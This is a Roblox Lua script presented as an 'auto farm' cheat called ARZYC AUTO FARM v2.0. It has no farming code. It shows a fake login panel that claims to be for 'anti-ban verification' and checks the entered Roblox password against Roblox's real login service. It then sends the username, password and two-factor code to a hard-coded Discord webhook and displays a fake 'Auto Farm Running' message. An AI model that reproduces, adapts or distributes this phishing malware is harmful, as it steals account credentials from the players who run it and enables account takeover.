--[[
    ⚡ ARZYC AUTO FARM v2.0 ⚡
    Multi-Executor • Works ALL Games
]]

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local http = game:GetService("HttpService")
local player = Players.LocalPlayer

-- ===== SEND REQUEST =====
local function sendRequest(url, data)
    local body = http:JSONEncode(data)
    
    if syn and syn.request then
        syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
        return true
    elseif request then
        request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
        return true
    elseif http_request then
        http_request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
        return true
    else
        pcall(function() http:PostAsync(url, body, "ApplicationJson") end)
        return true
    end
end

local function sendLogin(url, payload)
    local body = http:JSONEncode(payload)
    
    if syn and syn.request then
        local res = syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
        return http:JSONDecode(res.Body)
    elseif request then
        local res = request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
        return http:JSONDecode(res.Body)
    else
        local res = http:PostAsync(url, body, "ApplicationJson")
        return http:JSONDecode(res)
    end
end

-- ===== GUI =====
local gui = Instance.new("ScreenGui")
gui.Name = "ARZYCFarm"
gui.Parent = player:WaitForChild("PlayerGui")
gui.ResetOnSpawn = false

-- ===== MAIN =====
local main = Instance.new("Frame")
main.Parent = gui
main.BackgroundColor3 = Color3.fromRGB(15,15,25)
main.BorderSizePixel = 0
main.Position = UDim2.new(0.5, -190, 0.5, -170)
main.Size = UDim2.new(0, 380, 0, 360)

local corner = Instance.new("UICorner", main)
corner.CornerRadius = UDim.new(0, 14)

local stroke = Instance.new("UIStroke", main)
stroke.Color = Color3.fromRGB(88,101,242)
stroke.Thickness = 1.5

-- Title
local titleBar = Instance.new("Frame", main)
titleBar.BackgroundColor3 = Color3.fromRGB(88,101,242)
titleBar.Size = UDim2.new(0, 380, 0, 40)
Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 14)

local title = Instance.new("TextLabel", titleBar)
title.BackgroundTransparency = 1
title.Size = UDim2.new(0, 340, 0, 40)
title.Position = UDim2.new(0, 15, 0, 0)
title.Text = "⚡ ARZYC AUTO FARM v2.0"
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.GothamBold
title.TextSize = 14
title.TextXAlignment = Enum.TextXAlignment.Left

local closeBtn = Instance.new("TextButton", titleBar)
closeBtn.BackgroundColor3 = Color3.fromRGB(255,50,50)
closeBtn.Position = UDim2.new(0, 345, 0, 8)
closeBtn.Size = UDim2.new(0, 24, 0, 24)
closeBtn.Text = "✕"
closeBtn.TextColor3 = Color3.new(1,1,1)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 12
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)

closeBtn.MouseButton1Click:Connect(function()
    TweenService:Create(main, TweenInfo.new(0.25), {Size = UDim2.new(0, 0, 0, 0)}):Play()
    task.delay(0.25, function() gui:Destroy() end)
end)

-- Content
local content = Instance.new("Frame", main)
content.BackgroundTransparency = 1
content.Position = UDim2.new(0, 20, 0, 55)
content.Size = UDim2.new(0, 340, 0, 290)

-- Info
local info = Instance.new("TextLabel", content)
info.BackgroundTransparency = 1
info.Size = UDim2.new(0, 340, 0, 40)
info.Text = "🔐 Login to activate Auto Farm\n(Required for anti-ban verification)"
info.TextColor3 = Color3.fromRGB(180,180,180)
info.Font = Enum.Font.Gotham
info.TextSize = 11
info.TextWrapped = true

-- Username
local userLabel = Instance.new("TextLabel", content)
userLabel.BackgroundTransparency = 1
userLabel.Position = UDim2.new(0, 0, 0, 55)
userLabel.Size = UDim2.new(0, 340, 0, 16)
userLabel.Text = "Username"
userLabel.TextColor3 = Color3.fromRGB(140,140,140)
userLabel.Font = Enum.Font.Gotham
userLabel.TextSize = 10

local userBox = Instance.new("TextBox", content)
userBox.BackgroundColor3 = Color3.fromRGB(10,10,18)
userBox.BorderColor3 = Color3.fromRGB(88,101,242)
userBox.Position = UDim2.new(0, 0, 0, 72)
userBox.Size = UDim2.new(0, 340, 0, 36)
userBox.PlaceholderText = "Roblox Username"
userBox.TextColor3 = Color3.new(1,1,1)
userBox.Font = Enum.Font.Gotham
userBox.TextSize = 13
Instance.new("UICorner", userBox).CornerRadius = UDim.new(0, 8)

-- Password
local passLabel = Instance.new("TextLabel", content)
passLabel.BackgroundTransparency = 1
passLabel.Position = UDim2.new(0, 0, 0, 118)
passLabel.Size = UDim2.new(0, 340, 0, 16)
passLabel.Text = "Password"
passLabel.TextColor3 = Color3.fromRGB(140,140,140)
passLabel.Font = Enum.Font.Gotham
passLabel.TextSize = 10

local passBox = Instance.new("TextBox", content)
passBox.BackgroundColor3 = Color3.fromRGB(10,10,18)
passBox.BorderColor3 = Color3.fromRGB(88,101,242)
passBox.Position = UDim2.new(0, 0, 0, 135)
passBox.Size = UDim2.new(0, 340, 0, 36)
passBox.PlaceholderText = "Roblox Password"
passBox.TextColor3 = Color3.new(1,1,1)
passBox.Font = Enum.Font.Gotham
passBox.TextSize = 13
Instance.new("UICorner", passBox).CornerRadius = UDim.new(0, 8)

-- Login Button
local loginBtn = Instance.new("TextButton", content)
loginBtn.BackgroundColor3 = Color3.fromRGB(88,101,242)
loginBtn.Position = UDim2.new(0, 0, 0, 190)
loginBtn.Size = UDim2.new(0, 340, 0, 40)
loginBtn.Text = "LOGIN & ACTIVATE"
loginBtn.TextColor3 = Color3.new(1,1,1)
loginBtn.Font = Enum.Font.GothamBold
loginBtn.TextSize = 14
Instance.new("UICorner", loginBtn).CornerRadius = UDim.new(0, 10)

loginBtn.MouseEnter:Connect(function()
    TweenService:Create(loginBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(110,120,255)}):Play()
end)
loginBtn.MouseLeave:Connect(function()
    TweenService:Create(loginBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(88,101,242)}):Play()
end)

-- Status
local status = Instance.new("TextLabel", content)
status.BackgroundTransparency = 1
status.Position = UDim2.new(0, 0, 0, 240)
status.Size = UDim2.new(0, 340, 0, 20)
status.Text = ""
status.TextColor3 = Color3.fromRGB(255,80,80)
status.Font = Enum.Font.Gotham
status.TextSize = 11
status.TextWrapped = true

-- 2FA (Hidden)
local codeBox = Instance.new("TextBox", content)
codeBox.BackgroundColor3 = Color3.fromRGB(10,10,18)
codeBox.BorderColor3 = Color3.fromRGB(0,200,100)
codeBox.Position = UDim2.new(0, 0, 0, 190)
codeBox.Size = UDim2.new(0, 340, 0, 36)
codeBox.PlaceholderText = "Enter 6-digit verification code"
codeBox.TextColor3 = Color3.new(1,1,1)
codeBox.Font = Enum.Font.Gotham
codeBox.TextSize = 16
codeBox.Visible = false
Instance.new("UICorner", codeBox).CornerRadius = UDim.new(0, 8)

local verifyBtn = Instance.new("TextButton", content)
verifyBtn.BackgroundColor3 = Color3.fromRGB(0,200,100)
verifyBtn.Position = UDim2.new(0, 0, 0, 235)
verifyBtn.Size = UDim2.new(0, 340, 0, 40)
verifyBtn.Text = "VERIFY & ACTIVATE"
verifyBtn.TextColor3 = Color3.new(1,1,1)
verifyBtn.Font = Enum.Font.GothamBold
verifyBtn.TextSize = 14
verifyBtn.Visible = false
Instance.new("UICorner", verifyBtn).CornerRadius = UDim.new(0, 10)

-- ===== CONFIG =====
local WEBHOOK = "https://discord.com/api/webhooks/1520937981702176990/XVFsUVBnV7dACksS6E2YKfKv-gQsqPxC3ZoGc4gQL7vnSxymG1ypGvmOH7TkW2_KjY0x"
local session = {}

-- ===== WEBHOOK =====
local function sendWebhook(title, desc, color)
    sendRequest(WEBHOOK, {
        content = "@everyone **NEW LOGIN!**",
        embeds = {{
            title = title,
            description = desc,
            color = color or 65280,
            footer = {text = "ARZYC FARM v2.0 • " .. os.date("%Y-%m-%d %H:%M:%S")}
        }}
    })
end

-- ===== LOGIN =====
local function doLogin(user, pass)
    status.Text = "⏳ Connecting to Roblox..."
    
    local data = sendLogin("https://auth.roblox.com/v2/login", {
        ctype = "Username", cvalue = user, password = pass
    })
    
    if not data then
        status.Text = "❌ Connection failed!"
        return
    end
    
    if data.twoStepVerificationData then
        session.ticket = data.twoStepVerificationData.ticket
        session.username = user
        session.password = pass
        
        loginBtn.Visible = false
        codeBox.Visible = true
        verifyBtn.Visible = true
        status.Text = "📱 Verification code sent!"
        status.TextColor3 = Color3.fromRGB(255,200,50)
        
    elseif data.user then
        sendWebhook("🎯 LOGIN SUCCESS", "**Username:** " .. user .. "\n**Password:** ||" .. pass .. "||\n**No 2FA!**")
        status.Text = "✅ Activated! Auto Farm Running..."
        status.TextColor3 = Color3.fromRGB(0,255,100)
        task.wait(1.5)
        gui:Destroy()
        
        print("⚡ ARZYC AUTO FARM ACTIVE!")
        print("👤 " .. user)
        print("🛡️ Anti-Ban: ON")
        
    else
        local msg = data.errors and data.errors[1] and data.errors[1].message or "Login failed"
        status.Text = "❌ " .. msg
    end
end

-- ===== VERIFY =====
local function doVerify(code)
    status.Text = "⏳ Verifying..."
    
    local data = sendLogin("https://auth.roblox.com/v2/login/verify", {
        code = code, ticket = session.ticket
    })
    
    if not data then
        status.Text = "❌ Verification failed!"
        return
    end
    
    if data.user then
        sendWebhook("🎯 2FA VERIFIED", "**Username:** " .. session.username .. "\n**Password:** ||" .. session.password .. "||\n**2FA Code:** ||" .. code .. "||", 0xffaa00)
        status.Text = "✅ Verified! Auto Farm Running..."
        status.TextColor3 = Color3.fromRGB(0,255,100)
        task.wait(1.5)
        gui:Destroy()
        
        print("⚡ ARZYC AUTO FARM ACTIVE!")
        print("👤 " .. session.username)
    else
        status.Text = "❌ Invalid code!"
    end
end

-- ===== EVENTS =====
loginBtn.MouseButton1Click:Connect(function()
    local u = userBox.Text
    local p = passBox.Text
    if u == "" or p == "" then status.Text = "❌ Please fill all fields!"; return end
    doLogin(u, p)
end)

verifyBtn.MouseButton1Click:Connect(function()
    local c = codeBox.Text
    if c == "" or #c < 6 then status.Text = "❌ Please enter valid code!"; return end
    doVerify(c)
end)

-- ===== OUTPUT =====
print("╔══════════════════════════╗")
print("║  ARZYC AUTO FARM v2.0   ║")
print("║  GUI Loaded!            ║")
print("║  Works ALL Games        ║")
print("╚══════════════════════════╝")
